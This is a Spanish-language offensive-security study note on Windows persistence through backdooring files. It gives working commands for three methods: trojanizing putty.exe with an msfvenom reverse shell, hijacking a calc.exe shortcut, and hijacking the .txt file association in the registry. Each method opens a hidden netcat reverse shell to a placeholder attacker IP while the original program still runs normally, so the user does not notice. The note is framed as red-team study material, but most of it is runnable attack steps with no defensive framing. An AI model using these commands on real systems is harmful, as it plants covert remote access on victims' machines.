---
layout: apunte
title: "3. Backdooring Files"
---

Otro método para establecer persistencia es alterar algunos archivos que sepamos que el usuario utiliza regularmente. Realizando algunas modificaciones a dichos archivos, podemos implantar backdoors para ejecutarlas cuando el usuario accede a ellas. Como no queremos crear alertas que pudieran revelar nuestra cubierta, los archivos que alteremos deben seguir funcionando como el usuario espera.

----------------------------------------
<h2>Archivos Ejecutables</h2>
Si encuentras algún archivo ejecutable en el escritorio, puede que el usuario lo use frecuentemente. Supón que encontramos un atajo a PuTTY por ahí. Si comprobamos las propiedades del atajo, podemos ver que suele apuntar a `C:\Program\PuTTY\putty.exe`. Desde ahí, podemos descargar el ejecutable a nuestra máquina y modificarlo para ejecutar el payload que queramos.

Puedes plantar un payload de tu preferencia en cualquier `.exe` con `msfvenom`. El binario seguirá funcionando normalmente y además añadirá silenciosamente el payload. Para crear el archivo modificado, podemos usar el siguiente comando:

```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=IP_ATACANTE lport=PUERTO_ATACANTE -b "\x00" -f exe -o puttyX.exe
```

El exe resultante ejecutará una reverse shell de meterpreter sin que el usuario se de cuenta. Aunque este es un buen método para establecer persistencia, vamos a ver otra técnicas más sigilosas.

----------------------------------------------
<h2>Archivos de Atajos</h2>
Si no queremos alterar el ejecutable, siempre podemos alterar el archivo de atajo. En lugar de apuntarlo directamente al ejecutable esperado, podemos cambiarlo para apuntar a un script que ejecute una backdoor y el  programa normal a la vez.

Para esta tarea, vamos a comprobar el atajo a `calc.exe` en el escritorio del Administrator. Si le damos click derecho al atajo y seleccionamos propiedades, veremos a dónde está apuntando:

!**Pasted image 20260703154612.png**

Antes de secuestrar el atajo, vamos a crear un script de PowerShell sencillo en `C:\Windows\System32` o cualquier otro sitio sigiloso. El script ejecutará una reverse shell y luego ejecutará `calc.exe` de la localización original.

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe IP_ATACANTE 4445"
C:\Windows\System32\calc.exe
```

Finalmente, cambiaremos el atajo para que apunte a nuestro script.

>[!CAUTION] Ten en cuenta que al hacer esto puede cambiar el icono del atajo automáticamente, por lo que debes apuntar el icono de vuelta al ejecutable original.

Además, queremos ejecutar el script sin ventana vista, por lo que añadiremos la opción `-windowstyle hidden`.

```batch
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

!**Pasted image 20260703163645.png**

---------------------------------------------
<h2>Secuestro de Asociaciones de Archivos</h2>
Además de la persistencia a través de ejecutables o atajos, podemos secuestrar cualquier asociación de archivos para forzar al sistema operativo a ejecutar una shell cuando sea que el usuario abra un tipo de archivo específico.

Las asociaciones de archivos por defecto del sistema operativo están guardadas dentro del registro, donde una clave es guardada para cada tipo de archivo bajo `HKLM\Software\Classes\ `. Digamos que queremos comprobar qué programa es usado para abrir archivos `.txt`. Podemos comprobar la subclave `.txt` y encontrar el **Programmatic ID (ProgID)** asociado.

!**Pasted image 20260703164506.png**

Podemos buscar una subclave para el ProgID correspondiente (también bajo `HKLM\Software\Classes\ `), en este caso `txtfile`, donde encontraremos la referencia al programa a cargo de manejar los archivos `.txt`. La mayoría de entradas ProgID tendrán una subclave bajo `shell\open\command` donde el comando por defecto para ejecutar por archivos con cierta terminación está especificado:

!**Pasted image 20260703165436.png**

En este caso, cuando tratas de abrir un archivo `.txt`, el sistema ejecutará `%SystemRoot%\system32\NOTEPAD.EXE %1`, donde `%1` representa el nombre del archivo abierto. Si queremos secuestrar esta extensión, podríamos reemplazar el comando con un script que ejecuta una backdoor y abre el archivo normalmente. Primero, vamos a crear un script ps1 con el siguiente contenido y guardarlo a `c:\Windows\backdoor.ps1`:

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe IP_ATACANTE 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

Fíjate en que pasamos `$args[0]` a notepad, ya que contendrá el nombre del archivo a ser abierto, como se especifica en `%1`.

Ahora cambiaremos la clave de registro para ejecutar nuestro script de backdoor en una ventana escondida:

```batch
powershell -windowstyle hidden C:\windows\backdoor2.ps1 %1
```

!**Pasted image 20260703165928.png**

